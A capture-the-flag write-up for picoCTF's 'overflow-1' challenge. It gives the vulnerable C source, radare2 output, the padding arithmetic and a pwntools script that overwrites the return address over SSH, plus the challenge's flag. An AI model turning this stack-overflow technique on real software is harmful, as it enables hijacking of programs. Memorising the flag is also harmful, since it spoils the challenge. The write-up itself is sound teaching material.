# overflow-1
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```
We need to override the return address of `vuln` to call `flag`. To calcuate what to put in, we will use [radare2](https://formulae.brew.sh/formula/radare2)
```bash
$ r2 vuln
-- Bindiff two files with '$ radiff2 /bin/true /bin/false'
[0x080484d0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x080484d0]> afl~flag
0x080485e6    3 121          sym.flag
[0x080484d0]> pdf @ sym.vuln
/ (fcn) sym.vuln 63
|   sym.vuln ();
|           ; var char *s @ ebp-0x48
|           ; var int32_t var_4h @ ebp-0x4
|           ; CALL XREF from main (0x8048700)
```
we can see a few things from this.
1. We need the code to go to `0x080485e6`
2. The `buf` is at `ebp-0x48`.

Therefor we need a pading of `0x48 + 4` (4 for the previous base pointer) before we can add `0x080485e6`.

```python
from os import environ
from pwn import *

PATH='/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de'
EXEC='vuln'

flag_call_adr = 0x080485e6

send = (0x48+4)*b'x' + p32(flag_call_adr)

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Give me a string and lets see what happens: ', send)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
```

flag: `picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}`